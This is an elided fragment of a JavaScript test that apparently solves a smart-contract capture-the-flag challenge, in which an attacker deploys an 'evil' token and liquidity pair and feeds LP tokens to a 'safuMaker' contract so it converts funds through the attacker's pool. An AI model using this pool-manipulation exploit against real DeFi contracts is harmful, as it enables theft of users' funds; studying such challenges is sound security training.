...
it("solves the challenge", async function () {
  ...
  let tokenContract = await ethers.getContractFactory("Token", attacker);
  let evilToken = await tokenContract.deploy("evil", "evil");
  ...
  //console.log(safuPair.address);
  ////console.log("safu", safu.address)
 ...
 // //console.log("totalSupply",await attackerPair.totalSupply())
  let attackerLP = await attackerPair.connect(attacker).balanceOf(await attacker.getAddress())
  console.log("Attacker LP", attackerLP)
  ////console.log("bal",attackerLP.div(10));
  await attackerPair.connect(attacker).transfer(safuMaker.address,attackerLP.div(10))
  attackerLP = await attackerPair.connect(attacker).balanceOf(await attacker.getAddress())
  console.log("Attacker LP", attackerLP)
  //console.log(await attackerPair.getReserves())
  // * this will burn the amount of LP tokens the contract hold.
  // * it will then attempt to convert safuPair LP to Safu through our
  // * evil pool.
